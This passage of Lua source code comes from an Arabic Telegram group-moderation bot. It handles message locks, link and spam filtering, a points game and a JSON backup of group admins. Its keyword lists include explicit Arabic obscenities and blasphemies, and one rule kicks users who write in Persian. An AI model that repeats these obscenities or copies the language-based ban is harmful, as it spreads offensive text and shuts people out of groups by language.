Welcomes = DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@BLACK_TEAM_4]'))
Dev_Joker(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source BlAcK     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source BlAcK     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevJoker:get(BlAcK..'Joker:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevJoker:get(BlAcK..'Joker:Spam:Text'..msg.chat_id_))
end
if DevJoker:get(BlAcK..'Joker:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source BlAcK     --
if DevJoker:get(BlAcK.."Joker:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevJoker:del(BlAcK.."Joker:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevJoker:set(BlAcK.."Joker:Groups:Links"..msg.chat_id_,Link)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرابط بنجاح', 1, 'md')
DevJoker:del(BlAcK.."Joker:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     Source BlAcK     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevJoker:get('BlAcKTeam:'..BlAcK.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevJoker:del('BlAcKTeam:'..BlAcK..'id:user'..msg.chat_id_)  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevJoker:del('BlAcKTeam:'..BlAcK.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevJoker:del('BlAcKTeam:'..BlAcK.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevJoker:get('BlAcKTeam:'..BlAcK..'id:user'..msg.chat_id_)  
DevJoker:incrby(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Joker(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevJoker:del('BlAcKTeam:'..BlAcK..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevJoker:get('BlAcKTeam:'..BlAcK.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevJoker:del('BlAcKTeam:'..BlAcK..'ids:user'..msg.chat_id_)  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevJoker:del('BlAcKTeam:'..BlAcK.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevJoker:del('BlAcKTeam:'..BlAcK.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevJoker:get('BlAcKTeam:'..BlAcK..'ids:user'..msg.chat_id_)  
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_Joker(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevJoker:del('BlAcKTeam:'..BlAcK..'ids:user'..msg.chat_id_)  
end
end
--     Source BlAcK     --
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevJoker:get(BlAcK.."Joker:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevJoker:get(BlAcK.."Joker:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevJoker:get(BlAcK.."Joker:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevJoker:get(BlAcK.."Joker:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevJoker:get(BlAcK.."Joker:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالطائفيه هنا") 
end end
--     Source BlAcK     --
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' and ChCheck(msg) or text == 'جلب نسخه احتياطيه' and ChCheck(msg) or text == 'جلب النسخه الاحتياطيه' and ChCheck(msg) or text == '↫ جلب نسخه احتياطيه ᥀' and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK..'Joker:Groups') 
local BotName = (DevJoker:get(BlAcK.."Joker:NameBot") or 'بلاك')
local GetJson = '{"BotId": '..BlAcK..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevJoker:get(BlAcK.."Joker:Groups:Links"..v)
Welcomes = DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
JokerConstructors = DevJoker:smembers(BlAcK..'Joker:JokerConstructor:'..v)
Constructors = DevJoker:smembers(BlAcK..'Joker:BasicConstructor:'..v)
BasicConstructors = DevJoker:smembers(BlAcK..'Joker:Constructor:'..v)
Managers = DevJoker:smembers(BlAcK..'Joker:Managers:'..v)
Admis = DevJoker:smembers(BlAcK..'Joker:Admins:'..v)
Vips = DevJoker:smembers(BlAcK..'Joker:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #JokerConstructors ~= 0 then
GetJson = GetJson..'"JokerConstructors":['
for k,v in pairs(JokerConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..BlAcK..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..BlAcK..'.json', '᥀︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..BlAcK..'.json')
end
if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source BlAcK     --
if DevJoker:get(BlAcK.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Joker( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevJoker:get(BlAcK.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevJoker:del(BlAcK.."SET:GAME"..msg.chat_id_)   
Dev_Joker( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevJoker:del(BlAcK.."SET:GAME"..msg.chat_id_)   
Dev_Joker( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevJoker:get(BlAcK..'DevJoker4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevJoker:del(BlAcK..'DevJoker4'..msg.sender_user_id_)
return false  end 
DevJoker:del(BlAcK..'DevJoker4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
